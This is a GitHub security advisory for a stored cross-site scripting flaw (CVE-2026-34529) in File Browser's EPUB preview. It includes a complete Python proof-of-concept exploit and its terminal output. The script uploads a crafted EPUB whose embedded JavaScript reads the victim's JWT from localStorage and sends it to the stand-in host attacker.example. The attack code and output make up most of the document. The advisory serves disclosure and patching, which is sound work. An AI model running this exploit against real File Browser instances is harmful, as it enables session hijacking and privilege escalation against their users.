# [H] File Browser is vulnerable to Stored Cross-site Scripting via crafted EPUB file

## Summary
Severity: High
Advisory: GHSA-5vpr-4fgw-f69h
CVE: CVE-2026-34529
CWE: CWE-79
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N (CVSS_V3)
Published: 2026-03-31
Source: https://github.com/advisories/GHSA-5vpr-4fgw-f69h
Type: github-advisory

## Affected
- Go: `github.com/filebrowser/filebrowser/v2` — affected >=0 <2.62.2

## Details
### Summary

The EPUB preview function in File Browser is vulnerable to Stored Cross-site Scripting (XSS). JavaScript embedded in a crafted EPUB file executes in the victim's browser when they preview the file.

### Details

`frontend/src/views/files/Preview.vue` passes `allowScriptedContent: true` to the `vue-reader` (epub.js) component:
```js
// frontend/src/views/files/Preview.vue (Line 87)
:epubOptions="{
  allowPopups: true,
  allowScriptedContent: true,
}"
```
epub.js renders EPUB content inside a sandboxed <iframe> with srcdoc. However, the sandbox includes both allow-scripts and allow-same-origin, which [renders the sandbox ineffective](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#allow-top-navigation-to-custom-protocols) — the script can access the parent frame's DOM and storage.

The epub.js developers explicitly [warn against enabling scripted content](https://github.com/futurepress/epub.js?tab=readme-ov-file#scripted-content).

### PoC
I've crafted the PoC python script that could be ran on test environment using docker compose:

```yaml
services:

  filebrowser:
    image: filebrowser/filebrowser:v2.62.1
    user: 0:0
    ports:
      - "80:80"
```

And running this PoC python script:
```python
import argparse
import io
import sys
import zipfile
import requests


BANNER = """
  Stored XSS via EPUB PoC
  Affected: filebrowser/filebrowser <=v2.62.1
  Root cause: Preview.vue -> epubOptions: { allowScriptedContent: true }
  Related: CVE-2024-35236 (same pattern in audiobookshelf)
"""



CONTAINER_XML = """<?xml version="1.0" encoding="UTF-8"?>
<container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
  <rootfiles>
    <rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/>
  </rootfiles>
</container>"""



CONTENT_OPF = """<?xml version="1.0" encoding="UTF-8"?>
<package xmlns="http://www.idpf.org/2007/opf" unique-identifier="uid" version="3.0">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:identifier id="uid">poc-xss-epub-001</dc:identifier>
    <dc:title>Security Test Document</dc:title>
    <dc:language>en</dc:language>
    <meta property="dcterms:modified">2025-01-01T00:00:00Z</meta>
  </metadata>
  <manifest>
    <item id="chapter1" href="chapter1.xhtml" media-type="application/xhtml+xml"/>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
  </manifest>
  <spine>
    <itemref idref="chapter1"/>
  </spine>
</package>"""



NAV_XHTML = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
<head><title>Navigation</title></head>
<body>
  <nav epub:type="toc">
    <ol><li><a href="chapter1.xhtml">Chapter 1</a></li></ol>
  </nav>
</body>
</html>"""



XSS_CHAPTER = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>Chapter 1</title></head>
<body>
  <h1>Security Test Document</h1>
  <p>This document tests EPUB script execution in File Browser.</p>
  <p id="xss-proof" style="color: red; font-weight: bold;">Waiting...</p>
  <p id="ip-proof" style="color: orange; font-weight: bold;">Fetching IP...</p>
  <script>
  var out = document.getElementById("xss-proof");
  var ipOut = document.getElementById("ip-proof");
  var jwt = "not-found";
  try { jwt = window.parent.localStorage.getItem("jwt"); } catch(e) { jwt = "error: " + e.message; }
  out.innerHTML = "XSS OK" + String.fromCharCode(60) + "br/" + String.fromCharCode(62) + "JWT: " + jwt;
  fetch("https://ifconfig.me/ip").then(function(r){ return r.text(); }).then(function(ip){
    ipOut.textContent = "Victim public IP: " + ip.trim();
  }).catch(function(e){
    ipOut.textContent = "IP fetch failed: " + e.message;
  });
  var img = new Image();
  img.src = "https://attacker.example/?stolen=" + encodeURIComponent(jwt);
  </script>
</body>
</html>"""




def login(base: str, username: str, password: str) -> str:
    r = requests.post(f"{base}/api/login",
                      json={"username": username, "password": password},
                      timeout=10)
    if r.status_code != 200:
        print(f"[-] Login failed: {r.status_code}")
        sys.exit(1)
    return r.text.strip('"')



def build_epub() -> bytes:
    """Build a minimal EPUB 3 file with embedded JavaScript."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("mimetype", "application/epub+zip", compress_type=zipfile.ZIP_STORED)
        zf.writestr("META-INF/container.xml", CONTAINER_XML)
        zf.writestr("OEBPS/content.opf", CONTENT_OPF)
        zf.writestr("OEBPS/nav.xhtml", NAV_XHTML)
        zf.writestr("OEBPS/chapter1.xhtml", XSS_CHAPTER)
    return buf.getvalue()



def main():
    print(BANNER)
    ap = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="Stored XSS via malicious EPUB PoC",
        epilog="""examples:
  %(prog)s -t http://localhost:8080 -u admin -p admin
  %(prog)s -t http://target.com/filebrowser -u user -p pass

root cause:
  frontend/src/views/files/Preview.vue passes
  epubOptions: { allowScriptedContent: true } to the vue-reader
  (epub.js) component. The iframe sandbox includes allow-scripts
  and allow-same-origin, which lets the script access the parent
  frame's localStorage and make arbitrary network requests.

impact:
  Session hijacking, privilege escalation, data exfiltration.
  A low-privilege user with upload access can steal admin tokens.""",
    )

    ap.add_argument("-t", "--target", required=True,
                    help="Base URL of File Browser (e.g. http://localhost:8080)")
    ap.add_argument("-u", "--user", required=True,
                    help="Username to authenticate with")
    ap.add_argument("-p", "--password", required=True,
                    help="Password to authenticate with")
    if len(sys.argv) == 1:
        ap.print_help()
        sys.exit(1)
    args = ap.parse_args()

    base = args.target.rstrip("/")

    print()
    print("[*] ATTACK BEGINS...")
    print("====================")

    print(f"  [1] Authenticating to {base}")
    token = login(base, args.user, args.password)
    print(f"      Logged in as: {args.user}")

    print(f"\n  [2] Building malicious EPUB")
    epub_data = build_epub()
    print(f"      EPUB size: {len(epub_data)} bytes")

    upload_path = "/poc_xss_test.epub"
    print(f"\n  [3] Uploading to {upload_path}")
    requests.delete(f"{base}/api/resources{upload_path}",
                    headers={"X-Auth": token}, timeout=10)
    r = requests.post(
        f"{base}/api/resources{upload_path}?override=true",
        data=epub_data,
        headers={
            "X-Auth": token,
            "Content-Type": "application/epub+zip",
        },
        timeout=30
    )

    if r.status_code in (200, 201, 204):
        print(f"      Upload OK ({r.status_code})")
    else:
        print(f"      Upload FAILED: {r.status_code} {r.text[:200]}")
        sys.exit(1)

    preview_url = f"{base}/files{upload_path}"

    print(f"\n  [4] Done")
    print(f"      Preview URL: {preview_url}")
    print("====================")
    print()
    print()
    print(f"Open the URL above in a browser. You should see:")
    print(f"  - Red text:    \"XSS OK\" + stolen JWT token")
    print(f"  - Orange text: victim's public IP (via ifconfig.me)")
    print()
    print(f"NOTE: alert() is blocked by iframe sandbox (no allow-modals).")
    print(f"The attack is silent — JWT theft and network exfiltration work.")


if __name__ == "__main__":
    main()

```

And terminal output:
```bash
root@server205:~/sec-filebrowser# python3 poc_xss_epub.py  -t http://localhost -u admin -p VJlfum8fGTmyXx8t

  Stored XSS via EPUB PoC
  Affected: filebrowser/filebrowser <=v2.62.1
  Root cause: Preview.vue -> epubOptions: { allowScriptedContent: true }
  Related: CVE-2024-35236 (same pattern in audiobookshelf)


[*] ATTACK BEGINS...
====================
  [1] Authenticating to http://localhost
      Logged in as: admin

  [2] Building malicious EPUB
      EPUB size: 1927 bytes

  [3] Uploading to /poc_xss_test.epub
      Upload OK (200)

  [4] Done
      Preview URL: http://localhost/files/poc_xss_test.epub
====================


Open the URL above in a browser. You should see:
  - Red text:    "XSS OK" + stolen JWT token
  - Orange text: victim's public IP (via ifconfig.me)

NOTE: alert() is blocked by iframe sandbox (no allow-modals).
The attack is silent — JWT theft and network exfiltration work.
```


<br/>

### Impact
- JWT token theft — full session hijacking
- Privilege escalation — a low-privilege user with upload (Create) permission can steal an admin's token

## References
- https://github.com/filebrowser/filebrowser/security/advisories/GHSA-5vpr-4fgw-f69h
- https://nvd.nist.gov/vuln/detail/CVE-2026-34529
- https://github.com/filebrowser/filebrowser
- https://github.com/filebrowser/filebrowser/releases/tag/v2.62.2
